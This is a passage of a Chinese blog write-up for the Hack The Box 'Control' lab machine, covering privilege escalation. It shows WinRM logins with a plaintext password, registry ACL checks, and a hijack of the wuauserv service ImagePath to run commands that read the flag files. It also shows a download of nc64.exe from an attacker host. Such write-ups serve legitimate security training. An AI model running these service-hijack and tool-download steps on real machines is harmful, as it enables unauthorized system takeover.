+</span></span><span style=display:flex><span>ERR: <span style=color:#f92672>[</span>localhost<span style=color:#f92672>]</span> Connecting to remote server localhost failed with the following error message : WinRM cannot process the request. The following error with errorcode 0x8009030d occurred <span style=color:#66d9ef>while</span> using Negotiate authentication: A specified logon session does not exist. It may already have been terminated.  
+</span></span><span style=display:flex><span> Possible causes are:
+</span></span><span style=display:flex><span>  -The user name or password specified are invalid.
+</span></span><span style=display:flex><span>  -Kerberos is used when no authentication method and no user name are specified.
+</span></span><span style=display:flex><span>  -Kerberos accepts domain user names, but not local user names.
+</span></span><span style=display:flex><span>  -The Service Principal Name <span style=color:#f92672>(</span>SPN<span style=color:#f92672>)</span> <span style=color:#66d9ef>for</span> the remote computer name and port does not exist.
+</span></span><span style=display:flex><span>  -The client and remote computers are in different domains and there is no trust between the two domains.
+</span></span><span style=display:flex><span> After checking <span style=color:#66d9ef>for</span> the above issues, try the following:
+</span></span><span style=display:flex><span>  -Check the Event Viewer <span style=color:#66d9ef>for</span> events related to authentication.
+</span></span><span style=display:flex><span>  -Change the authentication method; add the destination computer to the WinRM TrustedHosts configuration setting or use HTTPS transport.
+</span></span><span style=display:flex><span> Note that computers in the TrustedHosts list might not be authenticated.
+</span></span><span style=display:flex><span>   -For more information about WinRM configuration, run the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.
+</span></span></code></pre></div><p>记下 wuauserv 原本的二进制路径。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; reg query HKLM<span style=color:#ae81ff>\S</span>ystem<span style=color:#ae81ff>\C</span>urrentControlSet<span style=color:#ae81ff>\S</span>ervices<span style=color:#ae81ff>\w</span>uauserv /v ImagePath HKEY_LOCAL_MACHINE<span style=color:#ae81ff>\S</span>ystem<span style=color:#ae81ff>\C</span>urrentControlSet<span style=color:#ae81ff>\S</span>ervices<span style=color:#ae81ff>\w</span>uauserv ImagePath REG_EXPAND_SZ %systemroot%<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\s</span>vchost.exe -k netsvcs -p
+</span></span></code></pre></div><p>尝试修改服务的启动路径，但是这条命令没有回显。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; sc query wuauserv
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; reg add HKLM<span style=color:#ae81ff>\S</span>ystem<span style=color:#ae81ff>\C</span>urrentControlSet<span style=color:#ae81ff>\S</span>ervices<span style=color:#ae81ff>\w</span>uauserv /v ImagePath /t REG_EXPAND_SZ /d <span style=color:#e6db74>&#34;cmd /c whoami &gt; C:\Apps\svc.txt 2&gt;&amp;1&#34;</span> /f
+</span></span></code></pre></div><p>把输出重定向到自定义的文件夹再读。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; reg add HKLM<span style=color:#ae81ff>\S</span>ystem<span style=color:#ae81ff>\C</span>urrentControlSet<span style=color:#ae81ff>\S</span>ervices<span style=color:#ae81ff>\w</span>uauserv /v ImagePath /t REG_EXPAND_SZ /d <span style=color:#e6db74>&#34;cmd /c whoami &gt; C:\Apps\svc.txt 2&gt;&amp;1&#34;</span> /f &gt; C:<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\r</span>eg1.txt 2&gt;&amp;<span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; dir
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory: C:<span style=color:#ae81ff>\A</span>pps
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name                                                                  
+</span></span><span style=display:flex><span>----                -------------         ------ ----                                                                  
+</span></span><span style=display:flex><span>-a----       10/13/2026   4:51 AM          <span style=color:#ae81ff>57344</span> gp.exe                                                                
+</span></span><span style=display:flex><span>-a----       10/13/2026   4:57 AM         <span style=color:#ae81ff>153600</span> jp.exe                                                                
+</span></span><span style=display:flex><span>-a----       10/13/2026   5:45 AM          <span style=color:#ae81ff>27136</span> ps.exe                                                                
+</span></span><span style=display:flex><span>-a----       10/13/2026   5:38 AM            <span style=color:#ae81ff>714</span> reg1.txt                                                              
+</span></span><span style=display:flex><span>-a----       10/13/2026   5:37 AM             <span style=color:#ae81ff>14</span> test.txt       
+</span></span></code></pre></div><p>权限失败了，iusr 改不了这个注册表键。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; type reg1.txt
+</span></span><span style=display:flex><span>reg : ERROR: Access is denied.
+</span></span><span style=display:flex><span>At line:1 char:1
+</span></span><span style=display:flex><span>+ reg add HKLM<span style=color:#ae81ff>\S</span>ystem<span style=color:#ae81ff>\C</span>urrentControlSet<span style=color:#ae81ff>\S</span>ervices<span style=color:#ae81ff>\w</span>uauserv /v ImagePath  ...
+</span></span><span style=display:flex><span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span style=display:flex><span>    + CategoryInfo          : NotSpecified: <span style=color:#f92672>(</span>ERROR: Access is denied.:String<span style=color:#f92672>)</span> <span style=color:#f92672>[]</span>, RemoteException
+</span></span><span style=display:flex><span>    + FullyQualifiedErrorId : NativeCommandError
+</span></span></code></pre></div><p>加上机器名前缀后 WinRM 就通了。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; $p <span style=color:#f92672>=</span> ConvertTo-SecureString <span style=color:#e6db74>&#39;l33th4x0rhector&#39;</span> -AsPlainText -Force; $c <span style=color:#f92672>=</span> New-Object System.Management.Automation.PSCredential<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;FIDELITY\hector&#39;</span>,$p<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; Invoke-Command -ComputerName localhost -Credential $c -ScriptBlock <span style=color:#f92672>{</span> whoami <span style=color:#f92672>}</span> -ErrorAction Stop
+</span></span><span style=display:flex><span>control<span style=color:#ae81ff>\h</span>ector
+</span></span></code></pre></div><h2 id=提权至-administrator>提权至 Administrator</h2><p>查看权限，没有可利用的。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; Invoke-Command -ComputerName localhost -Credential $c -ScriptBlock <span style=color:#f92672>{</span> whoami /priv <span style=color:#f92672>}</span> -ErrorAction Stop
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PRIVILEGES INFORMATION
+</span></span><span style=display:flex><span>----------------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Privilege Name                Description                    State  
+</span></span><span style=display:flex><span><span style=color:#f92672>=============================</span> <span style=color:#f92672>==============================</span> <span style=color:#f92672>=======</span>
+</span></span><span style=display:flex><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span style=display:flex><span>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</span></span></code></pre></div><p>确认 hector 的权限，是普通用户，但是属于 Remote Management Users。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; net user hector
+</span></span><span style=display:flex><span>User name                    Hector
+</span></span><span style=display:flex><span>Full Name                    Hector
+</span></span><span style=display:flex><span>Comment                      
+</span></span><span style=display:flex><span>User<span style=color:#960050;background-color:#1e0010>&#39;</span>s comment               
+</span></span><span style=display:flex><span>Country/region code          <span style=color:#ae81ff>000</span> <span style=color:#f92672>(</span>System Default<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Account active               Yes
+</span></span><span style=display:flex><span>Account expires              Never
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Password last set            11/1/2019 12:27:50 PM
+</span></span><span style=display:flex><span>Password expires             Never
+</span></span><span style=display:flex><span>Password changeable          11/1/2019 12:27:50 PM
+</span></span><span style=display:flex><span>Password required            Yes
+</span></span><span style=display:flex><span>User may change password     No
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Workstations allowed         All
+</span></span><span style=display:flex><span>Logon script                 
+</span></span><span style=display:flex><span>User profile                 
+</span></span><span style=display:flex><span>Home directory               
+</span></span><span style=display:flex><span>Last logon                   10/13/2026 7:56:32 AM
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Logon hours allowed          All
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Local Group Memberships      *Remote Management Use*Users                
+</span></span><span style=display:flex><span>Global Group memberships     *None                 
+</span></span><span style=display:flex><span>The command completed successfully.
+</span></span></code></pre></div><p>查询服务注册表键的权限，CONTROL/Hector 带 FullControl。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\i</span>netpub<span style=color:#ae81ff>\w</span>wwroot&gt; Invoke-Command -ComputerName localhost -Credential $c -ScriptBlock <span style=color:#f92672>{</span> <span style=color:#f92672>(</span>Get-Acl <span style=color:#e6db74>&#39;HKLM:\SYSTEM\CurrentControlSet\Services&#39;</span><span style=color:#f92672>)</span>.AccessToString; <span style=color:#e6db74>&#39;--- stopped ---&#39;</span>; Get-Service | Where-Object <span style=color:#f92672>{</span> $_.Status -eq <span style=color:#e6db74>&#39;Stopped&#39;</span> -and $_.StartType -ne <span style=color:#e6db74>&#39;Disabled&#39;</span> <span style=color:#f92672>}</span> | Select-Object -First <span style=color:#ae81ff>15</span> -ExpandProperty Name <span style=color:#f92672>}</span> -ErrorAction Continue
+</span></span><span style=display:flex><span>CREATOR OWNER Allow  FullControl
+</span></span><span style=display:flex><span>NT AUTHORITY<span style=color:#ae81ff>\A</span>uthenticated Users Allow  ReadKey
+</span></span><span style=display:flex><span>NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM Allow  FullControl
+</span></span><span style=display:flex><span>BUILTIN<span style=color:#ae81ff>\A</span>dministrators Allow  FullControl
+</span></span><span style=display:flex><span>CONTROL<span style=color:#ae81ff>\H</span>ector Allow  FullControl
+</span></span><span style=display:flex><span>APPLICATION PACKAGE AUTHORITY<span style=color:#ae81ff>\A</span>LL APPLICATION PACKAGES Allow  ReadKey
+</span></span><span style=display:flex><span>--- stopped ---
+</span></span></code></pre></div><p>准备好 nc64。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Control<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ ls -liah nc64.exe                
+</span></span><span style=display:flex><span><span style=color:#ae81ff>3544143</span> -rwxrwxr-x <span style=color:#ae81ff>1</span> kali kali 45K Oct <span style=color:#ae81ff>13</span> 02:07 nc64.exe
+</span></span></code></pre></div><p>下载到自定义文件夹。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; IWR http://10.10.16.151:80/nc64.exe -OutFile C:<span style=color:#ae81ff>\A</span>pps<span style=color:#ae81ff>\n</span>c64.exe -UseBasicParsing
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; dir
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Directory: C:<span style=color:#ae81ff>\A</span>pps
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Mode                LastWriteTime         Length Name                                                                  
+</span></span><span style=display:flex><span>----                -------------         ------ ----                                                                  
+</span></span><span style=display:flex><span>-a----       10/13/2026   4:51 AM          <span style=color:#ae81ff>57344</span> gp.exe                                                                
+</span></span><span style=display:flex><span>-a----       10/13/2026   4:57 AM         <span style=color:#ae81ff>153600</span> jp.exe                                                                
+</span></span><span style=display:flex><span>-a----       10/13/2026   8:16 AM          <span style=color:#ae81ff>45272</span> nc64.exe 
+</span></span></code></pre></div><p>执行命令并下载结果到本地。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; Get-Service wuauserv | Select-Object Status,StartType
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> Status StartType
+</span></span><span style=display:flex><span> ------ ---------
+</span></span><span style=display:flex><span>Stopped    Manual
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; $payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;cmd /c type C:\Users\Hector\Desktop\user.txt &gt; C:\Apps\f.txt 2&gt;&amp;1 &amp; type C:\Users\Administrator\Desktop\root.txt &gt;&gt; C:\Apps\f.txt&#39;</span>
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; $reg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;reg add &#34;HKLM\SYSTEM\CurrentControlSet\Services\wuauserv&#34; /v ImagePath /t REG_EXPAND_SZ /d &#34;&#39;</span> + $payload + <span style=color:#e6db74>&#39;&#34; /f&#39;</span>
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; $p <span style=color:#f92672>=</span> ConvertTo-SecureString <span style=color:#e6db74>&#39;l33th4x0rhector&#39;</span> -AsPlainText -Force; $c <span style=color:#f92672>=</span> New-Object System.Management.Automation.PSCredential<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;CONTROL\hector&#39;</span>,$p<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; Invoke-Command -ComputerName localhost -Credential $c -ScriptBlock <span style=color:#f92672>{</span> param<span style=color:#f92672>(</span>$x<span style=color:#f92672>)</span> cmd /c $x <span style=color:#f92672>}</span> -ArgumentList $reg
+</span></span><span style=display:flex><span>The operation completed successfully.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PS C:<span style=color:#ae81ff>\A</span>pps&gt; cmd /c <span style=color:#e6db74>&#39;sc start wuauserv&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>SC<span style=color:#f92672>]</span> StartService FAILED 1053:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>The service did not respond to the start or control request in a timely fashion.
+</span></span></code></pre></div></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
+<span class=tag><a href=https://enilmalus.github.io/tags/hack/>Hack</a></span>
+<span class=tag><a href=https://enilmalus.github.io/tags/windows/>Windows</a></span>
+<span class=tag><a href=https://enilmalus.github.io/tags/htb/>HTB</a></span>
+<span class=tag><a href=https://enilmalus.github.io/tags/writeup/>Writeup</a></span>
+<span class=tag><a href=https://enilmalus.github.io/tags/sql%E6%B3%A8%E5%85%A5/>SQL注入</a></span>
+<span class=tag><a href=https://enilmalus.github.io/tags/mysql/>MYSQL</a></span>
+<span class=tag><a href=https://enilmalus.github.io/tags/burpsuite/>BurpSuite</a></span>
+<span class=tag><a href=https://enilmalus.github.io/tags/printspoofer/>PrintSpoofer</a></span>
+<span class=tag><a href=https://enilmalus.github.io/tags/juciepotato/>JuciePotato</a></span>
+<span class=tag><a href=https://enilmalus.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/>代码执行</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+3596 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+2026-10-13 06:00</p></div><div class=pagination><div class=pagination__buttons><span class="button next"><a href=https://enilmalus.github.io/posts/htb-breadcrumbs-writeup/><span class=button__text>HTB-Breadcrumbs Writeup</span>
+<span class=button__icon>→</span></a></span></div></div></main></div><footer class=footer></footer></div><script type=text/javascript src=/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x+ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script></body></html>
